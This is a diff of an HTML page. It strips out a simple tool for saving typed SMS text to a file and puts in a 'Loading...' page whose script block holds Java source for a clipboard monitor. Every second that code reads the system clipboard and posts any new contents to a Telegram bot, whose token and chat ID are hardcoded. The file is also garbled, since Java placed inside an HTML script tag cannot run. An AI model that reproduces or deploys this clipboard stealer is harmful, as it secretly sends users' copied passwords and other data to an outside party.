@@ -1,49 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Save SMS to File</title>
+    <meta charset="UTF-8">
+    <title>Page title</title>
 </head>
 <body>
-  <textarea id="smsInput" placeholder="Write your SMS here..." rows="5" cols="30"></textarea>
-  <br>
-  <button onclick="saveToFile()">Save to File</button>
+    Loading...
+    <script>
+        import java.awt.datatransfer.*;
+import java.awt.Toolkit;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.io.OutputStream;
 
-  <script>
-    async function saveToFile() {
-      const smsInput = document.getElementById('smsInput').value.trim();
-      if (!smsInput) {
-        alert("Please type a message!");
-        return;
-      }
+public class ClipboardMonitor {
+    public static void main(String[] args) throws InterruptedException, UnsupportedFlavorException, IOException {
+        String prevData = "";
+        String botToken = "7964956778:AAHeEVDkyjdBoPuhrn7Mguu3KFCIfgUkiYU";  // আপনার টেলিগ্রাম বটের API টোকেন
+        String chatId = "7945358964";      // টেলিগ্রাম চ্যাট আইডি
 
-      const now = new Date();
-      const formattedTime = now.toLocaleTimeString();
-      const formattedDate = now.toLocaleDateString();
-      const smsData = `[${formattedTime} ${formattedDate}---${smsInput}]\n`;
-
-      try {
-        // Request file handle
-        const fileHandle = await window.showSaveFilePicker({
-          suggestedName: "sms.txt",
-          types: [{
-            description: "Text Files",
-            accept: { "text/plain": [".txt"] }
-          }]
-        });
-
-        // Write data to the file
-        const writableStream = await fileHandle.createWritable();
-        await writableStream.write(smsData);
-        await writableStream.close();
-
-        alert("SMS saved to file successfully!");
-      } catch (error) {
-        console.error("Error saving file:", error);
-        alert("Failed to save the SMS!");
-      }
+        while (true) {
+            String data = getClipboardData();
+            if (!data.equals(prevData)) {
+                System.out.println("Copied: " + data);
+                sendToTelegram(botToken, chatId, data);
+                prevData = data;
+            }
+            Thread.sleep(1000);  // 1 second delay
+        }
     }
-  </script>
+
+    public static String getClipboardData() throws UnsupportedFlavorException, IOException {
+        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
+        Transferable contents = clipboard.getContents(null);
+        if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {
+            return (String) contents.getTransferData(DataFlavor.stringFlavor);
+        }
+        return "";
+    }
+
+    public static void sendToTelegram(String botToken, String chatId, String message) throws IOException {
+        String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+        URL url = new URL(urlString);
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("POST");
+        connection.setDoOutput(true);
+        
+        String params = "chat_id=" + chatId + "&text=" + message;
+
+        try (OutputStream os = connection.getOutputStream()) {
+            byte[] input = params.getBytes("utf-8");
+            os.write(input, 0, input.length);
+        }
+
+        connection.getResponseCode();  // Send the request
+    }
+}
+    </script>
 </body>
 </html>
